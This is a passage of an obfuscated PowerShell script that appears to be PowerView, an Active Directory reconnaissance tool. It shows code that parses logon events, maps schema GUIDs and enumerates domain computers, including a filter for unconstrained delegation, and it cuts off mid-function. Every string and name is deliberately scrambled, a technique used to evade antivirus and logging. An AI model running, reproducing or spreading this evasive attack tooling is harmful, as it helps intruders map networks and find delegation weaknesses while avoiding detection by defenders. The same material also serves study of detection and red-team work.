 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Syst'+'em['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Provide'+'r['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Nam'+'e'+'=Ga'+'IMicrosof'+'t-Window'+'s'+'-Secur'+'ity-Auditi'+'ngGaI
 ')."R`EPlace"('GaI',[stRinG][cHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(L'+'e'+'vel=4'+' '+'or'+' '+'Lev'+'el='+'0) '+'a'+'nd '+'(Even'+'tID'+'=462'+'4 '+'or'+' '+'Eve'+'ntID='+'4625'+' '+'o'+'r '+'Eve'+'ntID=4'+'634'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EventDa'+'ta['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('(Data['+'@Na'+'me=aoA'+'Lo'+'gonTypea'+'oA'+']'+'=a'+'oA5ao'+'A ')."r`EpLA`CE"(([CHar]97+[CHar]111+[CHar]65),[strIng][CHar]39)+'o'+'r '+('D'+'ata'+'[@Name={0}Logo'+'nT'+'ype'+'{0}]='+'{0}0'+'{'+'0})
'+' ')  -f[chAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('Da'+'t'+'a[@Name'+'='+'nX'+'5'+'TargetUserName'+'nX5]=nX5A'+'NONYMOUS ')."rEPLA`ce"('nX5',[StrIng][CHAr]39)+('LOGON{0}
'+' ') -F [chaR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'r
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('D'+'ata'+'[@'+'N'+'ame='+'RhdTar'+'get'+'U'+'serSI'+'DRhd'+']'+'=RhdS-1'+'-'+'5-1'+'8Rhd
 ')  -rePLACe'Rhd',[ChAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+')'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+'</'+'Suppr'+'ess>
 '+' '+' '+' '+('<'+'/Query>
</Q'+'ueryLi'+'s'+'t>
t'+'DO')."REP`la`CE"(([CHAR]116+[CHAR]68+[CHAR]79),[StRIng][CHAR]34))
        ${eveNta`R`g`UMENtS} = @{
            ("{1}{2}{0}" -f 'h','FilterXP','at') = ${X`patH`FILTEr}
            ("{1}{0}{2}"-f 'a','LogN','me') = ("{0}{2}{1}" -f'Sec','ity','ur')
            ("{2}{0}{1}" -f'axEv','ents','M') = ${mA`xEVE`NTs}
        }
        if (${PsB`oUn`dP`ArAMEteRs}[("{1}{2}{3}{0}" -f'l','Cre','de','ntia')]) { ${Ev`e`NTAr`gu`MenTs}[("{2}{1}{0}" -f'dential','re','C')] = ${cRE`De`NtiaL} }
    }

    PROCESS {
        ForEach (${C`Om`PuT`er} in ${COm`pUternA`mE}) {

            ${eve`N`TArGU`mENtS}[("{2}{1}{0}"-f'e','m','ComputerNa')] = ${COM`put`eR}

            &("{0}{1}{2}"-f 'Get-Wi','nEve','nt') @EventArguments| &("{1}{4}{0}{3}{2}" -f '-Obje','For','t','c','Each') {
                ${Ev`Ent} = ${_}
                ${pR`o`PE`RTIeS} = ${e`V`EnT}."pRo`PE`RTiES"
                Switch (${ev`eNt}."I`D") {
                    
                    4624 {
                        
                        if(-not ${pRoP`ErTI`ES}[5]."Va`lue".("{2}{0}{1}"-f 'W','ith','Ends').Invoke('$')) {
                            ${ouTP`Ut} = &("{1}{2}{0}"-f 't','New-O','bjec') ("{1}{0}"-f 'Object','PS') -Property @{
                                ("{3}{0}{2}{1}"-f 'mp','erName','ut','Co')              = ${coM`puTer}
                                ("{3}{0}{1}{2}" -f'eC','r','eated','Tim')               = ${eV`eNt}."timEC`RE`A`TED"
                                ("{0}{1}" -f'Eve','ntId')                   = ${ev`ent}."Id"
                                ("{0}{2}{3}{1}" -f'SubjectU','id','s','erS')            = ${pr`OpE`Rties}[0]."VA`LUE".("{2}{1}{0}" -f 'ing','r','ToSt').Invoke()
                                ("{0}{3}{2}{1}"-f'Subjec','ame','erN','tUs')           = ${P`RoPE`R`TIeS}[1]."Va`LUE"
                                ("{1}{3}{0}{2}"-f'bject','S','DomainName','u')         = ${ProP`Er`T`Ies}[2]."VaL`Ue"
                                ("{2}{4}{1}{0}{3}" -f 'ogo','tL','Subje','nId','c')            = ${pRo`PEr`TieS}[3]."vAL`Ue"
                                ("{0}{1}{3}{2}" -f'Tar','g','rSid','etUse')             = ${P`Ro`pERtIEs}[4]."VaL`UE".("{2}{1}{0}"-f'g','rin','ToSt').Invoke()
                                ("{0}{3}{2}{1}"-f'T','rName','e','argetUs')            = ${p`R`O`PERtIeS}[5]."va`LuE"
                                ("{0}{1}{2}" -f'Target','Do','mainName')          = ${P`R`OPER`TIes}[6]."Val`UE"
                                ("{3}{2}{0}{1}" -f 'o','nId','getLog','Tar')             = ${PR`op`Er`Ties}[7]."v`AluE"
                                ("{1}{2}{0}" -f'ype','Logon','T')                 = ${pr`O`perTies}[8]."V`AlUE"
                                ("{0}{2}{5}{1}{3}{4}" -f'L','cess','ogon','Na','me','Pro')          = ${PrOpERT`I`eS}[9]."val`UE"
                                ("{0}{6}{3}{5}{1}{4}{2}" -f 'Au','g','me','ent','eNa','icationPacka','th') = ${PRo`PERTI`Es}[10]."V`ALue"
                                ("{2}{3}{0}{1}" -f 'N','ame','Worksta','tion')           = ${Pr`oPer`TiEs}[11]."val`UE"
                                ("{1}{0}{2}" -f'n','Logo','Guid')                 = ${P`ROp`Erties}[12]."val`Ue"
                                ("{4}{3}{2}{0}{1}{5}"-f 'ervi','c','ttedS','smi','Tran','es')       = ${pr`OP`Er`Ties}[13]."V`AluE"
                                ("{2}{0}{3}{1}" -f'Pack','geName','Lm','a')             = ${p`Ro`PERtIeS}[14]."v`ALUE"
                                ("{1}{2}{0}"-f'th','KeyLen','g')                 = ${p`RoPe`RTI`Es}[15]."Va`Lue"
                                ("{1}{2}{0}"-f 'ssId','Pr','oce')                 = ${pR`o`PErTiES}[16]."Va`LUE"
                                ("{0}{1}{2}"-f'Pr','oces','sName')               = ${p`ROP`ErTiEs}[17]."vA`LUE"
                                ("{0}{1}"-f'Ip','Address')                 = ${pR`OP`ErtieS}[18]."VAL`UE"
                                ("{2}{0}{1}" -f'P','ort','Ip')                    = ${pr`OPe`R`TiES}[19]."V`AlUe"
                                ("{4}{2}{1}{3}{0}" -f'el','tion','na','Lev','Imperso')        = ${prO`PER`T`iEs}[20]."VA`lue"
                                ("{0}{3}{1}{2}" -f 'Restricte','minMod','e','dAd')       = ${Pro`P`ERT`ies}[21]."vA`LUe"
                                ("{3}{4}{2}{0}{5}{6}{1}" -f 'dUse','me','tboun','TargetO','u','r','Na')    = ${p`ROpEr`TIeS}[22]."vA`LUE"
                                ("{4}{1}{3}{5}{2}{0}"-f'Name','tO','ain','utboundDo','Targe','m')  = ${PRoPE`R`TIeS}[23]."VAl`UE"
                                ("{1}{2}{0}{3}"-f'A','Virtua','l','ccount')            = ${PrOPe`RT`ieS}[24]."V`ALuE"
                                ("{5}{3}{0}{2}{4}{1}" -f 'kedL','Id','og','rgetLin','on','Ta')       = ${PropER`TI`Es}[25]."v`ALUE"
                                ("{1}{2}{0}{3}" -f 'ted','E','leva','Token')             = ${P`Rop`e`RtIEs}[26]."v`ALuE"
                            }
                            ${ou`Tp`Ut}."pSoBJe`CT"."TYp`en`AMES".("{0}{1}" -f 'Ins','ert').Invoke(0, ("{2}{4}{3}{1}{0}" -f 'Event','iew.Logon','P','rV','owe'))
                            ${OUtP`UT}
                        }
                    }

                    
                    4648 {
                        
                        if((-not ${p`R`OpERtieS}[5]."VA`lUE".("{2}{1}{0}" -f'With','s','End').Invoke('$')) -and (${pr`O`pERtIES}[11]."v`AlUe" -match ((("{2}{3}{1}{0}" -f'e','m.ex','taskhost','0c'))-repLAcE  ([Char]48+[Char]99+[Char]109),[Char]92))) {
                            ${Ou`T`PuT} = &("{2}{1}{0}{3}"-f 'w-Obj','e','N','ect') ("{0}{2}{1}"-f'PSObj','t','ec') -Property @{
                                ("{0}{2}{1}{3}"-f 'C','Na','omputer','me')              = ${cO`MP`UteR}
                                ("{2}{3}{0}{1}" -f 're','ated','Tim','eC')       = ${E`VeNT}."Ti`MeC`Re`Ated"
                                ("{2}{0}{1}" -f 'ent','Id','Ev')           = ${e`VENt}."i`D"
                                ("{2}{3}{1}{0}" -f 'erSid','s','Subject','U')    = ${PRoPER`Ti`es}[0]."V`ALue".("{0}{1}" -f'ToStrin','g').Invoke()
                                ("{0}{1}{2}" -f'Sub','ject','UserName')   = ${prO`Pe`RTI`eS}[1]."vAL`UE"
                                ("{1}{0}{3}{2}"-f'tDo','Subjec','ame','mainN') = ${p`R`oPEr`TIes}[2]."v`ALue"
                                ("{3}{0}{2}{1}"-f 'bjectL','gonId','o','Su')    = ${pR`OPEr`T`iEs}[3]."V`ALUE"
                                ("{2}{1}{0}" -f'uid','gonG','Lo')         = ${PROpER`T`i`eS}[4]."V`ALUE".("{0}{2}{1}"-f'To','tring','S').Invoke()
                                ("{1}{3}{2}{0}" -f 'ame','Targ','UserN','et')    = ${prO`p`ERTi`eS}[5]."v`AlUE"
                                ("{0}{3}{1}{2}"-f 'T','am','e','argetDomainN')  = ${p`RoPER`T`ies}[6]."vAL`Ue"
                                ("{1}{2}{3}{0}"-f'd','Targ','etLogonG','ui')   = ${pROpeR`T`IEs}[7]."V`AluE"
                                ("{0}{4}{3}{1}{2}"-f 'Targe','erN','ame','rv','tSe')  = ${P`ROpe`RTiES}[8]."va`lue"
                                ("{0}{1}{2}"-f 'Ta','r','getInfo')        = ${P`ROPer`TIES}[9]."Val`UE"
                                ("{0}{1}"-f'P','rocessId')         = ${p`Ro`PErT`IEs}[10]."v`AluE"
                                ("{0}{2}{3}{1}"-f 'Pr','e','ocessNa','m')       = ${p`ROP`ER`TiES}[11]."vAL`UE"
                                ("{1}{2}{0}"-f'ss','IpAdd','re')         = ${p`ROPe`Rt`ies}[12]."VAl`UE"
                                ("{0}{1}" -f 'IpPor','t')            = ${p`ROp`eRtIEs}[13]."VA`lue"
                            }
                            ${Outp`UT}."p`sob`ject"."ty`PEnAm`es".("{1}{0}"-f'sert','In').Invoke(0, ("{3}{5}{0}{1}{6}{2}{4}" -f'View.ExplicitCr','eden','L','Powe','ogonEvent','r','tial'))
                            ${oU`T`put}
                        }
                    }
                    ("{0}{1}" -f'defaul','t') {
                        &("{3}{1}{2}{0}" -f'rning','i','te-Wa','Wr') "No handler exists for event ID: $($Event.Id) "
                    }
                }
            }
        }
    }
}


function g`ET`-D`O`MAiNGUiDMAp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{1}{0}{3}"-f 'e','uldProc','o','ss','PSSh'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`O`main},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{4}{1}" -f 'nC','r','ai','Dom','ontrolle'})]
        [String]
        ${s`E`RvEr},

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`s`ULtPAG`eSIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SErverTI`mE`lim`IT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREdE`N`T`IAl} =  (gCi  ('VaRiaB'+'lE:'+'21'+'GV'+'7e')  ).VAlUE::"E`MptY"
    )

    ${gU`i`DS} = @{("{0}{3}{6}{7}{5}{9}{1}{2}{4}{10}{8}"-f '00000','0','-000000','0','00','000-00','00-0000','-0','00','0','00') = 'All'}

    ${foRE`sT`AR`g`Um`Ents} = @{}
    if (${pSBo`UNDPA`R`A`meTerS}[("{2}{3}{1}{0}"-f 'l','ntia','Cr','ede')]) { ${FOR`eSTaRguM`e`NtS}[("{1}{2}{0}"-f 'al','Cre','denti')] = ${c`Re`dE`NtIAL} }

    try {
        ${SChe`mA`P`AtH} = (&("{3}{1}{2}{0}"-f 't','et-F','ores','G') @ForestArguments)."scHe`MA"."nA`ME"
    }
    catch {
        throw ("{14}{4}{7}{2}{10}{9}{8}{3}{6}{16}{1}{5}{13}{15}{12}{0}{11}"-f 'res','st schema pa','ror in ret','ng','t-DomainGUIDMa','t',' ','p] Er','vi','e','ri','t','-Fo','h fr','[Ge','om Get','fore')
    }
    if (-not ${SC`HE`m`ApATH}) {
        throw ("{18}{12}{14}{7}{1}{15}{16}{10}{2}{9}{0}{13}{17}{8}{11}{5}{4}{3}{6}" -f'n','p] E','ri','o',' fr','schema path','m Get-Forest','DMa','rest','evi',' ret',' ','Domai','g ','nGUI','rror ','in','fo','[Get-')
    }

    ${sE`AR`C`H`eRARG`UMEnts} = @{
        ("{1}{2}{0}"-f'se','Searc','hBa') = ${S`CheMA`patH}
        ("{0}{2}{1}"-f'L','er','DAPFilt') = (("{2}{0}{3}{1}"-f 'IDGU',')','(schema','ID=*'))
    }
    if (${p`SBOUn`DParA`MEt`eRS}[("{1}{0}"-f'main','Do')]) { ${seArc`hERa`RgumEn`TS}[("{0}{1}" -f'Do','main')] = ${DO`MA`in} }
    if (${p`sbOun`dPAr`AMETERS}[("{1}{0}" -f'rver','Se')]) { ${seArc`H`EraRGUmen`TS}[("{0}{1}" -f'Ser','ver')] = ${S`ERVer} }
    if (${p`Sb`oUNdP`A`RAmE`TeRs}[("{3}{4}{1}{0}{2}" -f'i','eS','ze','Res','ultPag')]) { ${Se`Ar`ChEra`R`gUmEnts}[("{1}{0}{2}{3}"-f 'tPa','Resul','geSiz','e')] = ${rE`Sul`TPaGES`izE} }
    if (${PSb`O`UnDpaR`AmeTERs}[("{0}{2}{3}{1}"-f'S','Limit','erverT','ime')]) { ${S`eA`R`c`hERARguMeNTS}[("{2}{3}{0}{1}"-f'imi','t','S','erverTimeL')] = ${s`ERVE`RTim`EliMit} }
    if (${psbOUN`dPaRAM`E`TErs}[("{2}{1}{0}"-f 'tial','en','Cred')]) { ${s`EArcheR`ArGU`mEnTS}[("{0}{2}{1}" -f 'Credent','al','i')] = ${Crede`N`TIal} }
    ${ScHEm`Ase`Ar`ChEr} = &("{3}{2}{0}{1}"-f '-D','omainSearcher','et','G') @SearcherArguments

    if (${SCHEMA`S`E`ARChEr}) {
        try {
            ${rESuL`TS} = ${S`cH`emASE`ArCHeR}.("{1}{0}{2}"-f'nd','Fi','All').Invoke()
            ${rE`s`UltS} | &("{2}{1}{0}" -f 'Object','re-','Whe') {${_}} | &("{2}{1}{0}"-f 'ject','Ob','ForEach-') {
                ${gui`Ds}[(&("{0}{1}{2}" -f'N','ew-','Object') ("{1}{0}"-f'd','Gui') (,${_}."PRO`PERT`IeS"."sc`hEmAId`Guid"[0]))."g`Uid"] = ${_}."Pr`O`PERti`eS"."n`AmE"[0]
            }
            if (${ReSu`L`TS}) {
                try { ${R`esu`lts}.("{0}{1}" -f'd','ispose').Invoke() }
                catch {
                    &("{2}{1}{0}" -f'Verbose','e-','Writ') ('[G'+'et-Do'+'m'+'ainGUID'+'Map] '+'E'+'rr'+'or '+'d'+'isp'+'os'+'ing '+'of'+' '+'the'+' '+'Result'+'s'+' '+'obj'+'ect:'+' '+"$_")
                }
            }
            ${sCHEm`AsEAr`chER}.("{0}{1}"-f'dispos','e').Invoke()
        }
        catch {
            &("{0}{3}{2}{4}{1}" -f 'Wr','bose','te-V','i','er') ('['+'Ge'+'t-Domai'+'nGUIDM'+'ap] '+'Err'+'or '+'i'+'n '+'buildi'+'n'+'g '+'GU'+'ID '+'map'+': '+"$_")
        }
    }

    ${sea`R`C`heRArgUM`eNtS}[("{0}{2}{1}"-f 'S','archBase','e')] = ${s`Ch`EMa`pAth}.("{1}{0}"-f 'place','re').Invoke(("{1}{0}" -f'ma','Sche'),("{2}{1}{3}{0}" -f 'hts','-Ri','Extended','g'))
    ${SEA`RChEr`A`RGu`MeNTS}[("{2}{1}{0}"-f 'r','PFilte','LDA')] = (("{6}{5}{1}{3}{4}{0}{2}"-f 'olAccessRigh','je','t)','ctClass=','contr','ob','('))
    ${rIGht`sseaRch`Er} = &("{2}{1}{3}{4}{0}" -f 'r','t','Ge','-DomainS','earche') @SearcherArguments

    if (${ri`ghtssE`Ar`CheR}) {
        try {
            ${RESU`LTs} = ${RIgHt`ssEar`C`HER}.("{0}{2}{1}"-f'Fin','All','d').Invoke()
            ${REs`ULts} | &("{0}{2}{1}{3}" -f'Wher','e','e-Obj','ct') {${_}} | &("{1}{4}{3}{0}{2}" -f'je','ForEac','ct','-Ob','h') {
                ${Gu`ids}[${_}."propER`TI`ES"."righ`TS`gUId"[0].("{0}{2}{1}" -f 'to','tring','S').Invoke()] = ${_}."PRo`p`ERTI`eS"."N`AME"[0]
            }
            if (${R`eSuLts}) {
                try { ${r`esUlts}.("{0}{1}"-f'd','ispose').Invoke() }
                catch {
                    &("{2}{1}{0}" -f 'ose','Verb','Write-') ('[G'+'e'+'t-D'+'oma'+'in'+'GUIDMap] '+'Er'+'ror'+' '+'dispos'+'ing'+' '+'o'+'f '+'t'+'he '+'Resu'+'lts '+'o'+'bjec'+'t: '+"$_")
                }
            }
            ${r`i`g`HtSse`Archer}.("{0}{2}{1}" -f 'd','spose','i').Invoke()
        }
        catch {
            &("{2}{0}{1}" -f'-','Verbose','Write') ('[Ge'+'t'+'-Domai'+'nGUID'+'Map] '+'E'+'rr'+'or '+'i'+'n '+'buildi'+'ng'+' '+'GU'+'ID '+'ma'+'p: '+"$_")
        }
    }

    ${gUI`ds}
}


function GE`T-DOmAINcO`Mp`Ut`eR {


    [OutputType({"{1}{3}{2}{0}" -f'uter','Powe','ew.Comp','rVi'})]
    [OutputType({"{5}{1}{6}{3}{4}{0}{2}" -f'uter.Ra','o','w','ew.Co','mp','P','werVi'})]
    [CmdletBinding()]
    Param (
        [Parameter(POSiTiON = 0, VALUEfrOMPIpeLiNe = ${tR`Ue}, VAluEfroMPIpelInebYPropertynaME = ${T`Rue})]
        [Alias({"{2}{1}{3}{4}{0}" -f 'e','cco','SamA','u','ntNam'}, {"{0}{1}"-f 'N','ame'}, {"{0}{2}{3}{1}" -f'D','me','NSH','ostNa'})]
        [String[]]
        ${I`dE`Nti`TY},

        [Switch]
        ${u`NC`OnsTRa`INED},

        [Switch]
        ${T`RU`sTeDtO`A`UTh},

        [Switch]
        ${pRI`NTERs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{5}{0}{4}{1}{2}{3}"-f 'e','vicePrin','cipa','lName','r','S'})]
        [String]
        ${S`PN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${OpErAT`ING`sYS`TEm},

        [ValidateNotNullOrEmpty()]
        [String]
        ${sEr`Vice`PAck},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SiTE`Na`me},

        [Switch]
        ${P`INg},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`Ma`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'Filt','er'})]
        [String]
        ${L`D`AP`FIlter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PROPe`Rt`Ies},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'th','AD','SPa'})]
        [String]
        ${SeA`RC`hBa`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{2}{4}{1}" -f 'inContr','ler','o','Doma','l'})]
        [String]
        ${s`ErV`ER},

        [ValidateSet({"{1}{0}" -f'se','Ba'}, {"{2}{0}{1}" -f'e','Level','On'}, {"{1}{0}" -f'ubtree','S'})]
        [String]
        ${S`E`ARCH`ScOPe} = ("{0}{1}"-f 'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REs`ULTp`AGE`sI`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`V`ERtIME`lim`it},

        [ValidateSet({"{0}{1}" -f'D','acl'}, {"{0}{1}" -f'Grou','p'}, {"{1}{0}"-f 'ne','No'}, {"{1}{0}"-f'wner','O'}, {"{1}{0}" -f'l','Sac'})]
        [String]
        ${S`eCuR`it`ymaSKS},

        [Switch]
        ${T`oMBst`o`Ne},

        [Alias({"{2}{0}{1}" -f 'n','One','Retur'})]
        [Switch]
        ${FIND`o`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`e`DE`NtIAL} =   (  ItEM  VarIAblE:21gv7e  ).VaLuE::"emP`TY",

        [Switch]
        ${R`Aw}
    )

    DynamicParam {
        ${uA`Cv`ALUENaMes} =  $6HEi4::("{0}{1}"-f'GetNa','mes').Invoke(${UACEn`Um})
        
        ${UA`cvAl`UenA`meS} = ${uaCVAl`UENA`M`Es} | &("{1}{0}{2}{3}"-f 'h','ForEac','-Obj','ect') {${_}; "NOT_$_"}
        
        &("{1}{4}{6}{0}{3}{2}{5}" -f 'ra','New-','et','m','D','er','ynamicPa') -Name ("{1}{2}{0}" -f'Filter','UA','C') -ValidateSet ${ua`cVAl`UENAm`ES} -Type ([array])
    }

    BEGIN {
        ${s`EA`RChEr`ArgumE`NtS} = @{}
        if (${psb`oUNd`pAr`AMeTE`RS}[("{1}{0}{2}"-f 'i','Doma','n')]) { ${se`ArcHEr`AR`gU`MeNts}[("{1}{0}" -f 'main','Do')] = ${d`oma`In} }
        if (${PSbO`UndPA`R`A`METeRs}[("{0}{2}{1}"-f 'Propert','s','ie')]) { ${sEARCHeRarg`Um`EN`Ts}[("{2}{1}{0}" -f 'perties','o','Pr')] = ${PROp`eRT`Ies} }
        if (${PSBo`Un`dpAra`MEte`Rs}[("{1}{0}{2}" -f 'ch','Sear','Base')]) { ${SEA`RcHe`R`ARGUMe`NTS}[("{1}{0}{2}" -f's','SearchBa','e')] = ${S`e`Ar`ChBAsE} }
        if (${PsB`oU`NDPARA`mEteRS}[("{0}{1}"-f 'Serv','er')]) { ${se`A`R`cHe`RaR`gumeNtS}[("{1}{0}"-f'erver','S')] = ${SEr`V`er} }
        if (${psB`OU`N`DParAmeTeRS}[("{1}{0}{3}{2}" -f'rch','Sea','cope','S')]) { ${seaRCHERarGU`M`e`N`TS}[("{2}{0}{1}" -f 'chS','cope','Sear')] = ${Se`ArCH`Sc`ope} }
        if (${PsBOUn`D`P`ArAMEteRS}[("{3}{1}{2}{0}"-f'e','sultPage','Siz','Re')]) { ${S`eaR`CHE`Ra`Rg`UmENtS}[("{0}{2}{1}{3}"-f'Resu','tP','l','ageSize')] = ${reSu`Lt`P`Age`SIzE} }
        if (${PSbOUndpa`R`AmE`TERS}[("{2}{0}{1}" -f 'TimeLi','mit','Server')]) { ${SEArc`hE`Ra`RgUmE`NtS}[("{1}{3}{0}{2}{4}" -f'Tim','Serve','eLi','r','mit')] = ${sE`R`V`erTIme`LIMit} }
        if (${PsB`Ou`NDPaR`AM`eTE`Rs}[("{2}{4}{3}{1}{0}"-f'ks','s','Se','tyMa','curi')]) { ${SEArche`RArgU`m`En`TS}[("{1}{2}{0}"-f 'sks','S','ecurityMa')] = ${Secu`RiTy`MaSks} }
        if (${pSboUnDp`A`R`A`m`Eters}[("{2}{0}{1}" -f 'o','mbstone','T')]) { ${sEa`Rch`eRarg`UMentS}[("{1}{0}{2}" -f'bst','Tom','one')] = ${tOMB`STo`Ne} }
        if (${psBO`UnDPAr`AM`ETeRs}[("{2}{0}{1}" -f'tia','l','Creden')]) { ${seAR`cH`ErAr`gumEn`TS}[("{1}{0}{2}"-f'ntia','Crede','l')] = ${C`R`EdeNti`AL} }
        ${coMP`SEa`RChER} = &("{1}{3}{0}{5}{4}{2}" -f'e','Get-D','cher','omainS','r','a') @SearcherArguments
    }

    PROCESS {
        
        if (${P`SbO`UN`dpAra`METeRS} -and (${P`Sbo`U`NDpARAm`eTE`Rs}."c`ount" -ne 0)) {
            &("{3}{0}{4}{1}{2}" -f 'w-DynamicP','a','meter','Ne','ar') -CreateVariables -BoundParameters ${pS`BO`Un`dParA`MeT`Ers}
        }

        if (${c`omPSeArc`H`er}) {
            ${iDe`N`TITYf`il`Ter} = ''
            ${Fi`Lter} = ''
            ${ID`EnTi`Ty} | &("{3}{2}{0}{1}" -f'c','t','bje','Where-O') {${_}} | &("{2}{0}{1}" -f'rEach-','Object','Fo') {
                ${ID`En`T`ityi`NST`ANce} = ${_}.("{0}{1}" -f 'Repl','ace').Invoke('(', '\28').("{1}{0}"-f'place','Re').Invoke(')', '\29')
                if (${I`de`NTit`YiNs`TA`NCe} -match ("{1}{0}"-f '-','^S-1')) {
                    ${iDEN`T`ity`FIlTer} += "(objectsid=$IdentityInstance)"
                }
                elseif (${iDeNtItYIN`st`A`N`ce} -match ("{0}{1}"-f'^','CN=')) {
                    ${IdeNtITyFi`L`T`er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psbounDP`ArA`MeTe`Rs}[("{1}{0}"-f 'ain','Dom')]) -and (-not ${PSB`ou`NDPAr`A`MEterS}[("{1}{2}{0}" -f'e','SearchB','as')])) {
                        
                        
                        ${id`ENtI`TY`dOmAiN} = ${IdeNtityiN`S`T`A`NcE}.("{0}{1}{2}" -f 'Su','bSt','ring').Invoke(${Id`E`NTitYIN`st`A`NcE}.("{0}{1}" -f'Index','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{3}{0}{2}"-f'-Ver','Wri','bose','te') ('[Get-D'+'omain'+'Comp'+'ut'+'er] '+'Ext'+'r'+'acted '+'dom'+'ain '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${sE`A`RChE`RAr`gUMEntS}[("{1}{2}{0}"-f 'n','Doma','i')] = ${IdentITyd`O`maIN}
                        ${ComP`S`eaRC`her} = &("{2}{0}{1}{3}{4}"-f 'et','-Dom','G','ain','Searcher') @SearcherArguments
                        if (-not ${CoM`pseAr`ChER}) {
                            &("{0}{1}{4}{3}{2}" -f'Wr','it','arning','-W','e') ('[G'+'et-Do'+'main'+'Com'+'puter] '+'Un'+'a'+'ble '+'to'+' '+'retriev'+'e'+' '+'d'+'oma'+'in '+'search'+'e'+'r'+' '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${IdEn`TiTyIN`s`TaNCE}.("{2}{0}{1}"-f 'ontain','s','C').Invoke('.')) {
                    ${i`DEN`TIT`YfIl`TER} += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif (${Id`ENT`it`yInStaNCe} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${guidbytE`stR`ING} = (([Guid]${idEnt`IT`Yi`NS`TAnCE}).("{1}{2}{0}" -f'ay','ToByt','eArr').Invoke() | &("{3}{4}{2}{1}{0}"-f 'ect','ch-Obj','Ea','Fo','r') { '\' + ${_}.("{0}{1}{2}"-f 'ToS','t','ring').Invoke('X2') }) -join ''
                    ${idEN`Ti`TyF`ILtEr} += "(objectguid=$GuidByteString)"
                }
                else {
                    ${IdeNT`ItyF`ILTEr} += "(name=$IdentityInstance)"
                }
            }
            if (${iDENt`ity`FIl`T`eR} -and (${I`DEn`TItY`FilTER}.("{1}{0}" -f 'im','Tr').Invoke() -ne '') ) {
                ${f`I`lTeR} += "(|$IdentityFilter)"
            }

            if (${P`sbOUNdPAraMEt`E`RS}[("{3}{0}{2}{1}" -f 'nst','d','raine','Unco')]) {
                &("{2}{1}{0}" -f 'se','rite-Verbo','W') ("{3}{10}{4}{9}{8}{6}{7}{12}{2}{5}{0}{11}{1}" -f'for ','ion',' wit','[Get-','omain','h ','rching ','for compu','er] Sea','Comput','D','unconstrained delegat','ters')
                ${F`Ilt`eR} += (("{1}{4}{3}{6}{7}{10}{9}{5}{11}{2}{12}{8}{0}" -f')','(userAccoun','42','l:1','tContro','.4.8','.2.840.','11','8','56.1','35','03:=52','8'))
            }
            if (${pSBoUNDPaR`A`M`Et`E`Rs}[("{0}{1}{2}"-f 'Truste','d','ToAuth')]) {
